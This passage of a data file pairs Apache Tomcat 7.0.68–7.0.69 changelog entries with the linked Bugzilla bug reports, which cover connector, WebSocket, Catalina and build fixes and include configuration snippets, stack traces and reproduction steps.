          <param-name>No-Store</param-name>
          <param-value>true</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>NoCachingFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    
    <!-- enable caching for static content -->
    <context-param>
        <param-name>NoCachingFilter enableCaching</param-name>
        <param-value>Set-Expires=true;No-Store=false;patterns=*.js,*.swf,*.jar,*.png,*.jpg,*.css</param-value>
    </context-param>
    
    <!-- Declaring this param in web.xml for specific webapp doesn't work, so leaving it here -->
    <context-param>
        <param-name>stinger.excluded.url.patterns</param-name>
        <param-value>/Comet/StartLiveSession,/Comet/Data,/Comet/EndLiveSession</param-value>
    </context-param>
 
And the following in the web.xml for application which has issues:

<?xml version=""1.0"" encoding=""UTF-8""?>

<web-app version=""2.5"" xmlns=""http://java.sun.com/xml/ns/javaee"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"">
    <servlet>
        <servlet-name>Live Viewer</servlet-name>
        <servlet-class>org.glassfish.jersey.servlet.ServletContainer</servlet-class>

        <init-param>
                <param-name>javax.ws.rs.Application</param-name>
                <param-value>com.avaya.acc.wcs.api.viewer.rest.app.LiveViewerRestApp</param-value>
        </init-param>

        <init-param>
            <!-- integrates JERSEY and JACKSON -->
            <param-name>com.sun.jersey.api.json.POJOMappingFeature</param-name>
            <param-value>true</param-value>
        </init-param>
        <init-param>
            <param-name>sendfileSize</param-name>
            <param-value>-1</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>Live Viewer</servlet-name>
        <url-pattern>/rest/*</url-pattern>
    </servlet-mapping>
</web-app>

I tried to remove async-supported from all our web.xml files and the issue is gone. So it's definitely related to <async-supported> configuration - without even actually using async functionality. We still need async-supported for our Comet interface so just disabling async is not an option for us.

I can turn on some additional logging and reproduce again if this will help - just let me know which logging is needed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58646
Coyote|Tomcat 7.0.69 (violetagg)|fix|59015|Fix potential cause of endless APR Poller loop during shutdown if the Poller experiences an error during the shutdown process. (markt)|Endless loop in APR poller during connector shutdown|"While running the TC 8 test suite and endless loop int he APR poller occured during the test org.apache.catalina.core.TestStandardWrapper. The situation might be a race condition that is not related to the specific test.

Code was TC 8 HEAD plus APR 1.2.4 based on OpenSSL 1.0.2f and APR 1.5.2. Platform Sun Solaris 10 Sparc. The machine was pretty busy, when the problem occured.

Error message occuring before the loop starts (only one such message):

    [junit] 16-Feb-2016 17:30:31.285 SEVERE [http-apr-127.0.0.1-auto-6-Poller] org.apache.tomcat.util.net.AprEndpoint$Poller.run Poller failed with error [9] : [Bad file number]

Relevant stacks:

main seems to hang in

    [junit] ""main"" prio=3 tid=0x0002a400 nid=0x2 runnable [0xfdf7d000]
    [junit]    java.lang.Thread.State: RUNNABLE
    [junit]     at org.apache.tomcat.jni.Pool.destroy(Native Method)
    [junit]     at org.apache.tomcat.util.net.AprEndpoint$Sendfile.destroy(AprEndpoint.java:2147)
    [junit]     at org.apache.tomcat.util.net.AprEndpoint.stopInternal(AprEndpoint.java:781)
    [junit]     at org.apache.tomcat.util.net.AbstractEndpoint.stop(AbstractEndpoint.java:814)
    [junit]     at org.apache.coyote.AbstractProtocol.stop(AbstractProtocol.java:517)
    [junit]     at org.apache.catalina.connector.Connector.stopInternal(Connector.java:1011)
    [junit]     at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:224)
    [junit]     - locked <0xe6337060> (a org.apache.catalina.connector.Connector)
    [junit]     at org.apache.catalina.core.StandardService.stopInternal(StandardService.java:517)
    [junit]     - locked <0xe633eb28> (a java.lang.Object)
    [junit]     at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:224)
    [junit]     - locked <0xe633ea58> (a org.apache.catalina.core.StandardService)
    [junit]     at org.apache.catalina.core.StandardServer.stopInternal(StandardServer.java:790)
    [junit]     at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:224)
    [junit]     - locked <0xe633e2c8> (a org.apache.catalina.core.StandardServer)
    [junit]     at org.apache.catalina.startup.Tomcat.stop(Tomcat.java:355)
    [junit]     at org.apache.catalina.startup.TomcatBaseTest.tearDown(TomcatBaseTest.java:218)


Poller seems to loop, whenever I look it is in:

    [junit] ""http-apr-127.0.0.1-auto-6-Poller"" daemon prio=3 tid=0x004fbc00 nid=0x4d runnable [0xb2aff000]
    [junit]    java.lang.Thread.State: RUNNABLE
    [junit]     at org.apache.tomcat.jni.Poll.create(Native Method)
    [junit]     at org.apache.tomcat.util.net.AprEndpoint.allocatePoller(AprEndpoint.java:881)
    [junit]     at org.apache.tomcat.util.net.AprEndpoint$Poller.run(AprEndpoint.java:1988)
    [junit]     at java.lang.Thread.run(Thread.java:745)
    [junit]

Regards,

Rainer"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59015
Coyote|Tomcat 7.0.69 (violetagg)|fix||Limit the default TLS ciphers for JSSE (BIO, NIO) and OpenSSL (APR) to those currently considered secure. (markt)|||
Coyote|Tomcat 7.0.69 (violetagg)|add||Add a new environment variable JSSE_OPTS that is intended to be used to pass JVM wide configuration to the JSSE implementation. The default value is -Djdk.tls.ephemeralDHKeySize=2048 which protects against weak Diffie-Hellman keys. (markt)|||
WebSocket|Tomcat 7.0.69 (violetagg)|fix|59014|Ensure that a WebSocket close message can be sent after a close message has been received. (markt)|No CloseMessage because of WebSocket connection has been closed|"In our test-cases we would like to handle 

Endpoint.onClose(Session session, CloseReason closeReason) {}

But looks the code isn't reachable.

WsSession does:

  state = State.CLOSED_SENT;

...

  sendCloseMessage(closeReasonMessage);

Where we have the code like in WsRemoteEndpointImplBase.startMessageBlock:

    FutureToSendHandler f2sh = new FutureToSendHandler(wsSession);
    startMessage(opCode, payload, last, f2sh);
    try {
        if (timeout == -1) {
            f2sh.get();
        } else {
            f2sh.get(timeout, TimeUnit.MILLISECONDS);
    }

That f2sh.get() does this:

    wsSession.registerFuture(this);

where:

    if (isOpen()) {
         futures.put(f2sh, f2sh);

    }
is false because our state is State.CLOSED_SENT not like:

    state == State.OPEN || state == State.SENDING_CLOSED

Therefore we never get result from that Future and our onClose() test fail.

You can find more info in the bug57489, especially https://bz.apache.org/bugzilla/show_bug.cgi?id=58624#c13 and its attachment.

The related Spring Integration JIRA: https://jira.spring.io/browse/INT-3909.

Thank you in advance!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59014
WebSocket|Tomcat 7.0.69 (violetagg)|fix||Correctly handle compression of partial messages when the final message fragment has a zero length payload. (markt)|||
WebSocket|Tomcat 7.0.69 (violetagg)|add||Extend the WebSocket programmatic echo endpoint provided in the examples to handle binary messages and also partial messages. This aligns the code with Tomcat 8 and makes it easier to run the Autobahn testsuite against the WebSocket implementation. (markt)|||
WebSocket|Tomcat 7.0.69 (violetagg)|fix|59119|Correct read logic for WebSocket client when using secure connections. (markt)|Improper forced reading causing client read timeout|"In source code [1], the ""forceRead"" section (from Line 265 to 273, as of today) does not reset ""forceRead"" to false after a forced read. This causes improper forced reading in follow-up loops even though there are still data in the socketChannel left over from last unwrap. As a result, it causes timeout in the WsWebSocketContainer.processResponse() method, and prevents websocket hand-shaking from completion.


[1] http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/tomcat/websocket/AsyncChannelWrapperSecure.java"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59119
WebSocket|Tomcat 7.0.69 (violetagg)|fix|59134|Correct client connect logic for secure connections made through a proxy. (markt)|Secure websocket connection through a proxy is not ok|"I have been trying to open a wss connection through a http proxy, and I always got the following exception:
  ...
  Caused by: javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
  ...
  Caused by: java.io.EOFException: null
  ...

Looking at network traffic shows that the proxy connect request is sent, proxy connection is established and then a plain GET request is sent instead of the SSL handshake.

Debugging in the WsWebSocketContainer::connectToServer() shows that there is a secure flag, to indicate whether an SSL connection is needed, but it never gets true when the connection is through a proxy.


http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/tomcat/websocket/WsWebSocketContainer.java

public Session connectToServer(Endpoint endpoint,
            ClientEndpointConfig clientEndpointConfiguration, URI path)
            throws DeploymentException
        ...
        boolean secure = false

        ...

        if (sa == null) {
            if (port == -1) {
                if (""ws"".equalsIgnoreCase(scheme)) {
                    sa = new InetSocketAddress(host, 80);
                } else {
                    // Must be wss due to scheme validation above
                    sa = new InetSocketAddress(host, 443);
                    secure = true;
                }
            } else {
                if (""wss"".equalsIgnoreCase(scheme)) {
                    secure = true;
                }
                sa = new InetSocketAddress(host, port);
            }
        } else {
            proxyConnect = createProxyRequest(host, port);
        }

        ..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59134
WebSocket|Tomcat 7.0.69 (violetagg)|fix|59189|Explicitly release the native memory held by the Inflater and Deflater when using PerMessageDeflate and the WebSocket session ends. Based on a patch by Henrik Olsson. (markt)|PerMessageDeflate leaves native memory allocated unnecessarily|"During websocket load tests we noticed that the resident memory usage of the tomcat process would grow and stay in use even after the sockets were closed when websocket compression was enabled. The java heap looked fine. It seems to be caused by PerMessageDeflate creating a Deflater and Inflater which in turn allocates native memory that isn't freed until the JVM decides to run their finalizers, which can take a long time before it happens.

I propose calling .end() (which is what finalize() does) on the Deflater and Inflater when the websocket is closed. I have created a patch that does this and resident memory usage shrinks after the websockets are closed down with it. Would you be interested in this?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59189
Web Applications|Tomcat 7.0.69 (violetagg)|fix||Correct the description of the ServletRequest.getServerPort() in Proxy How-To. Issue reported via comments.apache.org. (violetagg)|||
Web Applications|Tomcat 7.0.69 (violetagg)|fix||Fix a potential indefinite wait in the Comet Chat servlet in the examples web application. (markt)|||
Web Applications|Tomcat 7.0.69 (violetagg)|fix|59229|Fix error in HTTP docs and make clear the the HTTP NIO connector uses non-blocking I/O to read the HTTP request headers. (markt)|Wrong documentation: NIO connector is non-blocking when reading http request|"https://tomcat.apache.org/tomcat-7.0-doc/config/http.html

It says NIO connector is blocking for reading http request, actually it is non-blocking."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59229
Web Applications|Tomcat 7.0.69 (violetagg)|fix||Update in the documentation the link to the maven repository where Tomcat snapshot artifacts are deployed. (markt/violetagg)|||
Web Applications|Tomcat 7.0.69 (violetagg)|fix||Clarify in the documentation that calls to ServletContext.log(String, Throwable) or GenericServlet.log(String, Throwable) are logged at the SEVERE level. (violetagg)|||
Tribes|Tomcat 7.0.69 (violetagg)|fix||If promoting a proxy node to a primary node when getting a session, notify the change of the new primary node to the original backup node. (kfujino)|||
Tribes|Tomcat 7.0.69 (violetagg)|fix||Avoid NPE when a proxy node failed to retrieve a backup entry. (kfujino)|||
Tribes|Tomcat 7.0.69 (violetagg)|add||Add log of when received an unexpected messages. (kfujino)|||
Tribes|Tomcat 7.0.69 (violetagg)|add||Add the flag indicating that member is a localMember. (kfujino)|||
Other|Tomcat 7.0.69 (violetagg)|fix|58283|Change the default download location for libraries during the build process from /usr/share/java to ${user.home}/tomcat-build-libs. Patch provided by Ahmed Hosni. (markt)|Change Base Path to use (user.home) instead of absolute path|Change base.path property in build.properties.default to use ${user.home} instead of absolute path /user/share/java  to work with all operating systems and to work without special permissions on Linux/Unix systmes|https://bz.apache.org/bugzilla/show_bug.cgi?id=58283
Other|Tomcat 7.0.69 (violetagg)|fix|59031|When using the Windows uninstaller, do not remove the contents of any directories that have been symlinked into the Tomcat directory structure. (markt)|Tomcat 8 uninstaller entres a symbolic link and deletes its contents|My Tomcat 8 installation folder contained a symbolic link to a folder (A) for some project of mine. When uninstalling tomcat, the contents of my project folder (A) was removed.|https://bz.apache.org/bugzilla/show_bug.cgi?id=59031
Other|Tomcat 7.0.69 (violetagg)|update||Modify the default tomcat-users.xml file to make it harder for users to configure the entries intended for use with the examples web application for the Manager application. (markt)|||
Other|Tomcat 7.0.69 (violetagg)|fix|59211|Add hamcrest to Eclipse classpath. Patch is provided by Huxing Zhang. (violetagg)|Add hamcrest to IDE's classpath to make test case compilable|The ant task ide-eclipse helps us to generate configuration files for IDE, but I found that hamcrest is missing in the classpath generated for IDE. Thus I have to manually add it to classpath  in order to run test case from IDE.|https://bz.apache.org/bugzilla/show_bug.cgi?id=59211
Other|Tomcat 7.0.69 (violetagg)|update|59280|Update the NSIS Installer used to build the Windows Installers to version 2.51. (kkolinko)|Update the NSIS Installer to version 2.51|"NSIS: Nullsoft Scriptable Install System project that is used to build Windows installer for Tomcat released version 2.51 on April 1st 2016.

In its changelog [1][2] there is the following item:

* More security hardening to prevent dll hijacking


Full changelog:

[1] http://nsis.sourceforge.net/Docs/AppendixF.html#v2.51
[2] https://sourceforge.net/projects/nsis/files/NSIS%202/2.51/RELEASE.html/view"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59280
General|Tomcat 7.0.68 (violetagg)|add||Allow to configure multiple JUnit test class patterns with the build property test.name and document the property in BUILDING.txt. (rjung)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix||Correct implementation of validateClientProvidedNewSessionId so client provided session IDs may be rejected if validation is enabled. (markt)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix|56785|Avoid NullPointerException if directory exists on the class path that is not readable by the Tomcat user. (kkolinko)|NullPointer in processAnnotationsFile during Application Startup|"Hello,

we go the following exception in Aplicaiton startup. 

java.lang.NullPointerException
        at org.apache.catalina.startup.ContextConfig.processAnnotationsFile(ContextConfig.java:1966)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsFile(ContextConfig.java:1967)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1920)
        at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1878)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1146)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:768)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:303)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5069)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        ... 6 more

The reason was that we added -Duser.dir=<customDir> to give Tomcat a uniqe working dir. Within our <customDir> there was a directory which was not accessible for the tomcat user. It belongs to root and no one else has access. So tomcat tries to scan the user.dir and tries to list files within the restricted dir. 

Doing so ths file.listFiles() command retuns null (instead of a list of files) which is not correctly handled and causing this Nullpointer and preventing the Server from startup.

to recrate set -Duser.dir in setenv.sh to /tmp, create a folder /tmp/test, give permission 700 to /tmp/test, chwon root:root /tmp/test and start a tomcat with at least one application and a user other than root.

The fix would be to correctly handle nullpointers or to simply write a meningfull log message. 

Kind regards 
Juergen Sussner"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56785
Catalina|Tomcat 7.0.68 (violetagg)|fix|57906|Suppress WebappClassLoader log messages when running with a security manager on Java 6, caused by java.beans.Introspector.findExplicitBeanInfo() calls during evaluation of EL expressions. (kkolinko)|Message about failure to load ApplicationContextFacadeBeanInfo class when running with SecurityManager enabled|"I noted this while testing 7.0.62 release candidate, but this is reproducible with 7.0.61 as well, so it is not a regression.

The issue does not happen when running with Java 8u45.
The issue does not happen when running with Java 7u80.
The issue DOES happen when running with Java 6u45 (Windows 7).

So it depends on version of JRE.

Steps:
1. Get a clean copy of Tomcat 7
2. Set JAVA_HOME = jdk 6u45
3. Start with SecurityManager enabled  (catalina.bat start -security)
4. Access http://localhost:8080/
5. An INFO message with a stacktrace of java.security.AccessControlException is logged by WebappClassLoader to catalina.yyyy-mm-dd.log, as well as console.

I do not notice any user-visible consequences from the above. The index page shows successfully. Generated HTML is the same as when running without security manager.

The examples web application works successfully.

The message is only logged on the first access to index page of ROOT web application after Tomcat start. It is not logged on reloads of the page.

It is not logged for examples web application. If I restart Tomcat and walk around examples, there is no message. Once I visit the index page the message is logged.

The message: (Tomcat 7.0.62, Java 6u45)

[[[
08.05.2015 18:17:05 org.apache.catalina.loader.WebappClassLoader loadClass
INFO: Security Violation, attempt to use Restricted Class: org.apache.catalina.core.ApplicationContextFacadeBeanInfo
java.security.AccessControlException: access denied (java.lang.RuntimePermission accessClassInPackage.org.apache.catalina.core)
	at java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)
	at java.security.AccessController.checkPermission(AccessController.java:549)
	at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)
	at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1512)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1656)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1571)
	at java.beans.Introspector.instantiate(Introspector.java:1470)
	at java.beans.Introspector.findExplicitBeanInfo(Introspector.java:431)
	at java.beans.Introspector.<init>(Introspector.java:380)
	at java.beans.Introspector.getBeanInfo(Introspector.java:154)
	at javax.el.BeanELResolver$BeanProperties.<init>(BeanELResolver.java:252)
	at javax.el.BeanELResolver.property(BeanELResolver.java:373)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:97)
	at org.apache.jasper.el.JasperELResolver.getValue(JasperELResolver.java:104)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:183)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
	at org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:944)
	at org.apache.jsp.index_jsp._jspService(index_jsp.java:107)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:439)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:276)
	at org.apache.catalina.security.SecurityUtil$1.run(SecurityUtil.java:273)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAsPrivileged(Subject.java:517)
	at org.apache.catalina.security.SecurityUtil.execute(SecurityUtil.java:308)
	at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:168)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:297)
	at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:55)
	at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:191)
	at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:187)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:186)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:220)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:170)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:103)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:957)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:423)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1079)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:620)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:316)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:662)
]]]


I tried to workaround the issue by adding the following attribute to JreMemoryLeakPreventionListener class in server.xml [1]:

classesToInitialize=""org.apache.catalina.core.ApplicationContextFacadeBeanInfo""

to preload that class. The workaround did not help. The behaviour with Java 6u45 has not changed.


[1] http://tomcat.apache.org/tomcat-7.0-doc/config/listeners.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57906
Catalina|Tomcat 7.0.68 (violetagg)|fix|58692|Make StandardJarScanner more robust. Log a warning if a class path entry cannot be scanned rather than triggering the failure of the web application. (markt)|Odd classpath URLs cause Tomcat to abort loading webapps|"Created attachment 33326 [details]
Test class for StandardJarScanner

An application was created with Tomcat 8 and Apache Felix both embedded on the same JVM. Apache felix happens to add a URL to the application classloader's classpath via it's extension manager, which is used to support bundle fragment/extension features of the OSGi spec:

https://github.com/apache/felix/blob/ac5ec40ee40ec92dc8124e22afa855ab2c4a850f/framework/src/main/java/org/apache/felix/framework/ExtensionManager.java#L106

When Tomcat is started on the same JVM and a context is created, Tomcat will attempt to perform a jar scan on the classloader's classpath. It will call getURLs to enumerate all classpath URLs and peek inside for pluggability purposes:

https://github.com/apache/tomcat/blob/trunk/java/org/apache/tomcat/util/scan/StandardJarScanner.java#L221

For each URL enumerated from the classloader Tomcat attempts to transform it into a ClassPathEntry. For the special URL that Apache Felix adds, ClassPathEntry's getName method will return the empty string, as there is no file part in the URL itself:

https://github.com/apache/tomcat/blob/trunk/java/org/apache/tomcat/util/scan/StandardJarScanner.java#L353

There is no way to prevent this issue with a JarScanFilter, since the check method called here will use the empty string file name, which can't be matched using the glob matching algorithm:

https://github.com/apache/tomcat/blob/trunk/java/org/apache/tomcat/util/scan/StandardJarScanner.java#L237

Eventually this falls through to the process() method through this call:
https://github.com/apache/tomcat/blob/trunk/java/org/apache/tomcat/util/scan/StandardJarScanner.java#L244

Since the URL ""http://felix.extensions:9/"" has a compatible scheme (http) but no file part (it doesn't match the jar extension) we fall through to the else condition in the process method, which will attempt to call new File(new URL(""http://felix.extensions:9"")) and fail, because the File(URL) constructor requires that the URL start with ""file:/"":

https://github.com/apache/tomcat/blob/trunk/java/org/apache/tomcat/util/scan/StandardJarScanner.java#L317

This has the effect of bailing out the entire webapp loading.

Steps to reproduce:
I've created a test case which demonstrates the bug. I added this test case to TestStandardJarScanner to validate against 9.0 TRUNK, though the original bug was found on tomcat 8x.

For convenience i've attached a copy of the test class with this test case embedded in it.

    /**
     * Tomcat should ignore URLs which do not have a file part and do not use the file scheme.
     */
    @Test
    public void skipsInvalidClasspathURLNoFilePartNoFileScheme() {
        StandardJarScanner scanner = new StandardJarScanner();
        LoggingCallback callback = new LoggingCallback();
        TesterServletContext context = new TesterServletContext() {
            @Override
            public ClassLoader getClassLoader() {
                URLClassLoader urlClassLoader;
                try
                {
                    urlClassLoader = new URLClassLoader(new URL[] { new URL(""http://felix.extensions:9/"") });
                }
                catch (MalformedURLException e)
                {
                    throw new RuntimeException(e);
                }
                return urlClassLoader;
            }
        };
        scanner.scan(JarScanType.PLUGGABILITY, context, callback);
    }

WORKAROUNDS:
1. Disable classpath scanning in context.xml. This is a bit cumbersome for war files which contain their own context.xml as it requires a rebuild of all those downstream modules.
2. Add a LifecycleListener to hook into context creation events before they are initialized and set the jar filter to ignore empty string file names (due to the missing file name part of the class path entry)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58692
Catalina|Tomcat 7.0.68 (violetagg)|fix|58701|Reset the instanceInitialized field in StandardWrapper when unloading a Servlet so that a new instance may be correctly initialized. (markt)|JSP Reloading Initialization Problem|"Created attachment 33332 [details]
The logs for the tomcat reloading bug.

My company uses a custom inhouse tomcat library for hotloading generated source into tomcat at runtime. This custom classloader requires tomcat's JSP engine to perform a reload, so that it can recognize the newly generated classes. We are performing the following code to facilitate this:


    Context context = this.getContext();
    Wrapper jspWrapper = (Wrapper)context.findChild(""jsp"");
    
    // There might not be any jsps if we're just getting started.
    if (jspWrapper==null) return;

    jspWrapper.unload();
    jspWrapper.load();


This code works just fine on Tomcat 6. However, when migrating this custom classloader to Tomcat 8, a subsequent JSP page load fails with the attached stacktrace.

I have investigated this stack trace and come to the conclusion that, in StandardWrapper.java on line 1473, although the instance itself is set to null, the field ""instanceInitialized"" is still set to true. This means that my next call to load will recreate the JspServlet, but it will not be initialized correctly, thus causing the error in the attached stacktrace. I have seen in the debugger that it is indeed the case that the JspServlet is not being initialized properly.

A fix for this bug is to simply add this line:

instanceInitialized = false;

to line 1474 in StandardWrapper.java.

I have successfully been able to work around this bug in my own code with the following hack:

    Context context = this.getContext();
    Wrapper jspWrapper = (Wrapper)context.findChild(""jsp"");
    
    // There might not be any jsps if we're just getting started.
    if (jspWrapper==null) return;

    jspWrapper.unload();
    
    // tomcat-catalina 8.0.29
    // This custom hack is required to fix a bug in the StandardWrapper catalina sourcecode. This custom field in their source was not reset back to false
    // after calling unload, so the underlying JspServlet (the instance) did not get initialized properly upon calling load.
    // This bug happens in tomcat 7 and 8.
    AccessController.doPrivileged(new PrivilegedAction<Boolean>() {
      public Boolean run() {
        try
        {
          Field field = ((StandardWrapper)jspWrapper).getClass().getDeclaredField(""instanceInitialized"");
          field.setAccessible(true);
          field.setBoolean(jspWrapper, false);
        }
        catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException e)
        {
          throw new RuntimeException(e);
        }

        return Boolean.TRUE;
      }
    });
    
    
    jspWrapper.load();

Although as you can see it is far from ideal."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58701
Catalina|Tomcat 7.0.68 (violetagg)|fix|58702|Ensure an access log entry is generated if the client aborts the connection. (markt)|Access log lines are not written if client aborts|"Created attachment 33333 [details]
war file to demo the issue

When a client aborts a request to a web application before the response is written no line is written to the Tomcat access log.

I most recently tested this on an out-of-the-box 8.0.30 distribution but I have seen the problem occur on Tomcat 8.0.28 and 7.0.39 as well.

I believe that the general repro steps are as simple as this:

1) In a browser, hit any endpoint in a web application that has an AccessLogValve configured
2) Close the browser tab that made the request before the request finishes
3) Check the access log and note that no access log line was written for the request

Demo app:
I've attached a WAR file with a simple web application to demonstrate the problem. The source code for the application is included in the WAR.

The demo application has two servlets, one ""fast"" and one ""slow"". They both log a unique ID for the request to a logback-configured application log, then return a 200 response with a simple string. The only difference between them is that the fast servlet returns immediately while the slow servlet sleeps for 30 seconds before returning.

The unique request ID generated by these servlets is also added as a request attribute so that it can be shown in the access log.

Repro steps with the demo app:
1) Put the WAR file into a Tomcat container and load it.
2) Open a web browser and go to localhost:<port>/missing-access-log-demo/fast
3) Check the application and access logs at <catalina-base>/logs/missing-access-log-demo. Note that both logs generated a line for the request, and that the unique identifier for the request is the same in both files.
4) In a web browser, go to localhost:<port>/missing-access-log-demo/slow. Watch the application log as you make the request and you should see a line quickly added with the request's unique ID.
5) Before the request completes, close the browser tab that made the request.
6) Wait 30 seconds and watch the access log. Note that no line for this request is ever added.

Expected result:

Even if the client never gets the response, a request was processed by the server so I would expect to see it appear in the access logs.

Details:
I've stepped into the Tomcat code and it seems pretty clear this is happening in the CoyoteAdapter class:

http://svn.apache.org/viewvc/tomcat/tc8.0.x/tags/TOMCAT_8_0_30/java/org/apache/catalina/connector/CoyoteAdapter.java?view=markup

On line 558 the CoyoteAdapter calls response.finishResponse, right before the code that will call the access log. If the client is gone the finishResponse method throws an IOException when trying to flush its OutputBuffer. This exception causes the code to skip the call to context.logAccess and is then swallowed and ignored by the subsequent catch block."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58702
Catalina|Tomcat 7.0.68 (violetagg)|fix||Fixed various issues reported by Findbugs. (violetagg)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix|58735|Add support for the X-XSS-Protection header to the HttpHeaderSecurityFilter. Patch provided by Jacopo Cappellato. (markt)|Add support for X-XSS-Protection header|"Created attachment 33349 [details]
The patch that implements this feature.

The Tomcat's HttpHeaderSecurityFilter allows to set useful security related headers but it doesn't support the X-XSS-Protection header: https://www.owasp.org/index.php/List_of_useful_HTTP_headers

The attached patch enhance the filter to support this header."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58735
Catalina|Tomcat 7.0.68 (violetagg)|fix|58751|Correctly handle the case where an AsyncListener dispatches to a Servlet on an asynchronous timeout and the Servlet uses sendError() to trigger an error page. Includes a test case based on code provided by Andy Wilkinson.(markt)|Strange behaviour after calling sendError when an async request times out|"Created attachment 33359 [details]
Sample the reproduces the problem

This problem's probably most easily described with the attached sample. There's a servlet mapped to /error and a custom error page registered with /error as it's location. Another servlet is mapped to /timeout. It deliberately allows an async request to timeout and then calls response.sendError(503).

My expectation is that this will result in the request being routed to the error servlet and that, as a result, a 503 response will be returned with ""Error!"" in the body.

The actual outcome is that a 500 response is returned with ""Error!"" in the body:

$ curl -i localhost:8080/timeout
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Content-Length: 7
Date: Thu, 17 Dec 2015 20:49:00 GMT
Connection: close

Error!

And the following severe message and exception are logged:

SEVERE: Exception Processing ErrorPage[errorCode=0, location=/error]
java.lang.IllegalStateException: Cannot forward after response has been committed
	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:327)
